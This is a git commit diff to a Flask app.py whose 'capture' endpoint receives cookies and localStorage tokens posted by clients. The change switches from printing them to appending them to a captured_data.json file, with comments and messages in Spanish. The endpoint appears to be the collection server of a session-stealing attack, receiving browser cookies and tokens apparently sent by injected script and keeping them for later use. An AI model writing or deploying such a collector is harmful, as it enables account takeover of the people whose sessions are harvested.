b9f8cc8f34620889abb05ad6d9038590550b2b73
fernandohruk <fernandohr.uk@gmail.com>
2025-10-29 01:39:23 -0400

    app.py

--- app.py
+++ app.py
@@ -1,4 +1,5 @@
 from flask import Flask, request, jsonify, render_template
+import json
 
 app = Flask(__name__)
 
@@ -12,9 +13,13 @@ def capture():
     cookies = data.get('cookies')
     local_storage_tokens = data.get('localStorageTokens')
 
-    # Aquí puedes procesar las cookies y tokens como desees
-    print("Cookies:", cookies)
-    print("Local Storage Tokens:", local_storage_tokens)
+    # Guardar los datos en un archivo JSON
+    with open('captured_data.json', 'a') as f:
+        json.dump({
+            'cookies': cookies,
+            'localStorageTokens': local_storage_tokens
+        }, f)
+        f.write('\n')
 
     return jsonify({"message": "Datos recibidos con éxito"})
 
